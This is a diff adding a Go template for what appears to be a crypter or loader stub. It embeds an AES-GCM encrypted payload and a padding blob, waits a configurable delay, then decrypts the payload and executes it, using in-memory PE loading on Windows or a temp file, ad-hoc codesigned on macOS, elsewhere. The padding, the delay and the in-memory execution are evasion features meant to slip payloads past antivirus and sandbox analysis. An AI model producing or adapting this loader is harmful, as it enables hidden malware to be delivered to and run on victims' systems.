@@ -1,0 +1,134 @@
+package main
+
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	_ "embed"
+	"encoding/hex"
+	"fmt"
+	"os"
+	"os/exec"
+	"runtime"
+	"strings"
+	"time"
+)
+
+//go:embed payload.enc
+var payload []byte
+
+//go:embed padding.bin
+var padding []byte
+
+const embeddedKeyHex = "{{KEY}}"
+const delayMs = {{DELAY_MS}}
+
+const (
+	keySize   = 32
+	nonceSize = 12
+	tagSize   = 16
+)
+
+func decryptEmbedded() ([]byte, error) {
+	key, err := hex.DecodeString(embeddedKeyHex)
+	if err != nil {
+		return nil, err
+	}
+	if len(key) != keySize {
+		return nil, fmt.Errorf("invalid key size")
+	}
+	data := payload
+	hs := nonceSize + tagSize
+	if len(data) < hs {
+		return nil, fmt.Errorf("payload too short")
+	}
+	nonce := data[:nonceSize]
+	tag := data[nonceSize:hs]
+	ct := data[hs:]
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	buf := make([]byte, 0, len(ct)+tagSize)
+	buf = append(buf, ct...)
+	buf = append(buf, tag...)
+	return gcm.Open(nil, nonce, buf, nil)
+}
+
+func runPlain(plain []byte, args []string) error {
+	if runtime.GOOS == "windows" {
+		err := runPEInMemory(plain)
+		if err == nil {
+			return nil
+		}
+		// Fallback if PE loading fails (e.g., 32-bit exe, or missing TLS)
+		fmt.Fprintf(os.Stderr, "In-memory PE load failed: %v. Falling back to disk...\n", err)
+	}
+
+	h := 64
+	if len(plain) < h {
+		h = len(plain)
+	}
+	head := strings.TrimSpace(string(plain[:h]))
+	isPy := strings.HasPrefix(head, "#!") ||
+		strings.HasPrefix(head, "import ") ||
+		strings.HasPrefix(head, "from ") ||
+		strings.HasPrefix(head, "def ")
+
+	suffix := "evan-*.bin"
+	if runtime.GOOS == "windows" {
+		suffix = "evan-*.exe"
+	}
+	if isPy {
+		suffix = "evan-*.py"
+	}
+	tmp, err := os.CreateTemp("", suffix)
+	if err != nil {
+		return err
+	}
+	name := tmp.Name()
+	defer os.Remove(name)
+	if _, err := tmp.Write(plain); err != nil {
+		tmp.Close()
+		return err
+	}
+	if err := tmp.Close(); err != nil {
+		return err
+	}
+	var c *exec.Cmd
+	if isPy {
+		c = exec.Command("python3", append([]string{name}, args...)...)
+	} else {
+		if err := os.Chmod(name, 0o755); err != nil {
+			return err
+		}
+		if runtime.GOOS == "darwin" {
+			_ = exec.Command("codesign", "--force", "--sign", "-", name).Run()
+		}
+		c = exec.Command(name, args...)
+	}
+	c.Stdout, c.Stderr, c.Stdin = os.Stdout, os.Stderr, os.Stdin
+	return c.Run()
+}
+
+func main() {
+	runtime.KeepAlive(padding)
+	if delayMs > 0 {
+		time.Sleep(time.Duration(delayMs) * time.Millisecond)
+	}
+	plain, err := decryptEmbedded()
+	if err != nil {
+		fmt.Fprintln(os.Stderr, "error:", err)
+		os.Exit(1)
+	}
+	if err := runPlain(plain, os.Args[1:]); err != nil {
+		if ee, ok := err.(*exec.ExitError); ok {
+			os.Exit(ee.ExitCode())
+		}
+		fmt.Fprintln(os.Stderr, "error:", err)
+		os.Exit(1)
+	}
+}
